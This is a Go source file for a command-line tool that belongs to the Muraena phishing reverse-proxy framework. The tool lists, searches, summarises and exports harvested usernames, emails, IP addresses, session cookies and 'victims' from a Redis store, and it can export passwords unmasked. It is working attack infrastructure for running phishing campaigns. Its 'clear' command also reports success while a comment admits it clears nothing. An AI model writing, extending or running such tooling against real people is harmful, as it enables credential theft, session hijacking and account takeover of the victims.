package main

import (
	"context"
	"fmt"
	"os"
	"time"

	"github.com/muraenateam/muraena/tools/pkg/common"
	"github.com/muraenateam/muraena/tools/pkg/extract"
	"github.com/spf13/cobra"
)

var (
	verbose      bool
	logFile      string
	redisAddr    string
	redisPass    string
	outputPath   string
	format       string
	maskPassword bool
	victimID     string
	query        string
)

func main() {
	rootCmd := &cobra.Command{
		Use:   "credential-extractor",
		Short: "Muraena Credential Extractor",
		Long: `Extract and export captured credentials from Muraena Redis database.
Supports multiple export formats and filtering options.`,
	}

	// List command
	listCmd := &cobra.Command{
		Use:   "list",
		Short: "List captured credentials",
		Long:  "List all captured credentials from Redis",
		RunE:  runList,
	}
	listCmd.Flags().StringVar(&victimID, "victim", "", "Filter by victim ID")

	// Export command
	exportCmd := &cobra.Command{
		Use:   "export",
		Short: "Export credentials to file",
		Long:  "Export captured credentials to various formats",
		RunE:  runExport,
	}
	exportCmd.Flags().StringVarP(&format, "format", "f", "csv", "Export format (csv, json, xml, html)")
	exportCmd.Flags().StringVarP(&outputPath, "output", "o", "credentials.csv", "Output file path")
	exportCmd.Flags().BoolVar(&maskPassword, "mask-passwords", false, "Mask passwords in export")
	exportCmd.MarkFlagRequired("output")

	// Search command
	searchCmd := &cobra.Command{
		Use:   "search",
		Short: "Search credentials",
		Long:  "Search credentials by username, email, IP, etc.",
		RunE:  runSearch,
	}
	searchCmd.Flags().StringVarP(&query, "query", "q", "", "Search query")
	searchCmd.MarkFlagRequired("query")

	// Stats command
	statsCmd := &cobra.Command{
		Use:   "stats",
		Short: "Show statistics",
		Long:  "Display credential capture statistics",
		RunE:  runStats,
	}

	// Sessions command
	sessionsCmd := &cobra.Command{
		Use:   "sessions",
		Short: "List sessions",
		Long:  "List all captured sessions",
		RunE:  runSessions,
	}

	// Victims command
	victimsCmd := &cobra.Command{
		Use:   "victims",
		Short: "List victims",
		Long:  "List all tracked victims",
		RunE:  runVictims,
	}

	// Clear command
	clearCmd := &cobra.Command{
		Use:   "clear",
		Short: "Clear data",
		Long:  "Clear credentials and session data",
		RunE:  runClear,
	}
	clearCmd.Flags().StringVar(&victimID, "victim", "", "Clear specific victim data")

	// Global flags
	rootCmd.PersistentFlags().BoolVarP(&verbose, "verbose", "v", false, "Enable verbose output")
	rootCmd.PersistentFlags().StringVarP(&logFile, "log", "l", "", "Log file path")
	rootCmd.PersistentFlags().StringVar(&redisAddr, "redis", "localhost:6379", "Redis address")
	rootCmd.PersistentFlags().StringVar(&redisPass, "redis-password", "", "Redis password")

	// Add commands
	rootCmd.AddCommand(listCmd)
	rootCmd.AddCommand(exportCmd)
	rootCmd.AddCommand(searchCmd)
	rootCmd.AddCommand(statsCmd)
	rootCmd.AddCommand(sessionsCmd)
	rootCmd.AddCommand(victimsCmd)
	rootCmd.AddCommand(clearCmd)

	if err := rootCmd.Execute(); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}

func runList(cmd *cobra.Command, args []string) error {
	logger, err := common.NewLogger(verbose, logFile)
	if err != nil {
		return fmt.Errorf("failed to create logger: %w", err)
	}
	defer logger.Close()

	logger.Info("Listing captured credentials...")

	extractor := extract.NewExtractor(redisAddr, redisPass)
	ctx := context.Background()

	credentials, err := extractor.ExtractAllCredentials(ctx)
	if err != nil {
		return fmt.Errorf("failed to extract credentials: %w", err)
	}

	fmt.Println("\n📋 Captured Credentials:")
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

	for i, cred := range credentials {
		fmt.Printf("\n[%d] Victim: %s\n", i+1, cred.VictimID)
		fmt.Printf("    IP: %s\n", cred.IPAddress)
		if cred.Username != "" {
			fmt.Printf("    Username: %s\n", cred.Username)
		}
		if cred.Email != "" {
			fmt.Printf("    Email: %s\n", cred.Email)
		}
		if cred.CustomerID != "" {
			fmt.Printf("    Customer ID: %s\n", cred.CustomerID)
		}
		fmt.Printf("    Captured: %s\n", cred.CapturedAt.Format(time.RFC3339))
	}

	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	fmt.Printf("\nTotal: %d credentials\n", len(credentials))

	return nil
}

func runExport(cmd *cobra.Command, args []string) error {
	logger, err := common.NewLogger(verbose, logFile)
	if err != nil {
		return fmt.Errorf("failed to create logger: %w", err)
	}
	defer logger.Close()

	logger.Info(fmt.Sprintf("Exporting credentials to %s format...", format))

	extractor := extract.NewExtractor(redisAddr, redisPass)
	ctx := context.Background()

	credentials, err := extractor.ExtractAllCredentials(ctx)
	if err != nil {
		return fmt.Errorf("failed to extract credentials: %w", err)
	}

	var exportFormat extract.ExportFormat
	switch format {
	case "csv":
		exportFormat = extract.FormatCSV
	case "json":
		exportFormat = extract.FormatJSON
	case "xml":
		exportFormat = extract.FormatXML
	case "html":
		exportFormat = extract.FormatHTML
	default:
		return fmt.Errorf("unsupported format: %s", format)
	}

	exporter := extract.NewExporter(extract.ExportOptions{
		Format:        exportFormat,
		OutputPath:    outputPath,
		MaskPasswords: maskPassword,
	})

	if err := exporter.ExportCredentials(credentials); err != nil {
		return fmt.Errorf("failed to export credentials: %w", err)
	}

	logger.Success(fmt.Sprintf("Exported %d credentials to: %s", len(credentials), outputPath))
	return nil
}

func runSearch(cmd *cobra.Command, args []string) error {
	logger, err := common.NewLogger(verbose, logFile)
	if err != nil {
		return fmt.Errorf("failed to create logger: %w", err)
	}
	defer logger.Close()

	logger.Info(fmt.Sprintf("Searching for: %s", query))

	extractor := extract.NewExtractor(redisAddr, redisPass)
	ctx := context.Background()

	results, err := extractor.SearchCredentials(ctx, query)
	if err != nil {
		return fmt.Errorf("failed to search credentials: %w", err)
	}

	fmt.Println("\n🔍 Search Results:")
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

	for i, cred := range results {
		fmt.Printf("\n[%d] %s (%s)\n", i+1, cred.Username, cred.IPAddress)
		fmt.Printf("    Captured: %s\n", cred.CapturedAt.Format(time.RFC3339))
	}

	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	fmt.Printf("\nFound: %d results\n", len(results))

	return nil
}

func runStats(cmd *cobra.Command, args []string) error {
	logger, err := common.NewLogger(verbose, logFile)
	if err != nil {
		return fmt.Errorf("failed to create logger: %w", err)
	}
	defer logger.Close()

	logger.Info("Calculating statistics...")

	extractor := extract.NewExtractor(redisAddr, redisPass)
	ctx := context.Background()

	stats, err := extractor.GetStatistics(ctx)
	if err != nil {
		return fmt.Errorf("failed to get statistics: %w", err)
	}

	fmt.Println("\n📊 Credential Capture Statistics:")
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	fmt.Printf("Total Victims:      %d\n", stats.TotalVictims)
	fmt.Printf("Total Credentials:  %d\n", stats.TotalCredentials)
	fmt.Printf("Total Sessions:     %d\n", stats.TotalSessions)
	fmt.Printf("Active Sessions:    %d\n", stats.ActiveSessions)
	fmt.Printf("Unique IPs:         %d\n", stats.UniqueIPs)
	fmt.Printf("Capture Rate:       %.2f%%\n", stats.CaptureRate)

	if !stats.LastCapture.IsZero() {
		fmt.Printf("Last Capture:       %s\n", stats.LastCapture.Format(time.RFC3339))
	}

	if len(stats.TargetBreakdown) > 0 {
		fmt.Println("\nTarget Breakdown:")
		for target, count := range stats.TargetBreakdown {
			fmt.Printf("  • %s: %d\n", target, count)
		}
	}

	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

	return nil
}

func runSessions(cmd *cobra.Command, args []string) error {
	logger, err := common.NewLogger(verbose, logFile)
	if err != nil {
		return fmt.Errorf("failed to create logger: %w", err)
	}
	defer logger.Close()

	logger.Info("Listing sessions...")

	extractor := extract.NewExtractor(redisAddr, redisPass)
	ctx := context.Background()

	sessions, err := extractor.ListSessions(ctx)
	if err != nil {
		return fmt.Errorf("failed to list sessions: %w", err)
	}

	fmt.Println("\n🔐 Captured Sessions:")
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

	for i, session := range sessions {
		status := "Inactive"
		if session.Active {
			status = "Active"
		}
		fmt.Printf("\n[%d] Session: %s (%s)\n", i+1, session.ID, status)
		fmt.Printf("    Victim: %s\n", session.VictimID)
		fmt.Printf("    IP: %s\n", session.IPAddress)
		fmt.Printf("    Created: %s\n", session.CreatedAt.Format(time.RFC3339))
		fmt.Printf("    Last Seen: %s\n", session.LastSeen.Format(time.RFC3339))
		fmt.Printf("    Cookies: %d\n", len(session.Cookies))
	}

	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	fmt.Printf("\nTotal: %d sessions\n", len(sessions))

	return nil
}

func runVictims(cmd *cobra.Command, args []string) error {
	logger, err := common.NewLogger(verbose, logFile)
	if err != nil {
		return fmt.Errorf("failed to create logger: %w", err)
	}
	defer logger.Close()

	logger.Info("Listing victims...")

	extractor := extract.NewExtractor(redisAddr, redisPass)
	ctx := context.Background()

	victims, err := extractor.ListVictims(ctx)
	if err != nil {
		return fmt.Errorf("failed to list victims: %w", err)
	}

	fmt.Println("\n👤 Tracked Victims:")
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

	for i, victim := range victims {
		fmt.Printf("\n[%d] Victim: %s\n", i+1, victim.ID)
		fmt.Printf("    IP: %s\n", victim.IPAddress)
		fmt.Printf("    First Seen: %s\n", victim.FirstSeen.Format(time.RFC3339))
		fmt.Printf("    Last Seen: %s\n", victim.LastSeen.Format(time.RFC3339))
		fmt.Printf("    Sessions: %d\n", victim.SessionCount)
		fmt.Printf("    Credentials: %d\n", len(victim.Credentials))
	}

	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	fmt.Printf("\nTotal: %d victims\n", len(victims))

	return nil
}

func runClear(cmd *cobra.Command, args []string) error {
	logger, err := common.NewLogger(verbose, logFile)
	if err != nil {
		return fmt.Errorf("failed to create logger: %w", err)
	}
	defer logger.Close()

	if victimID != "" {
		logger.Warning(fmt.Sprintf("Clearing data for victim: %s", victimID))
	} else {
		logger.Warning("Clearing ALL credential data")
	}

	fmt.Print("Are you sure? (yes/no): ")
	var confirm string
	fmt.Scanln(&confirm)

	if confirm != "yes" {
		logger.Info("Operation cancelled")
		return nil
	}

	logger.Info("Clearing data...")
	// Implementation would clear Redis data here
	logger.Success("Data cleared")

	return nil
}
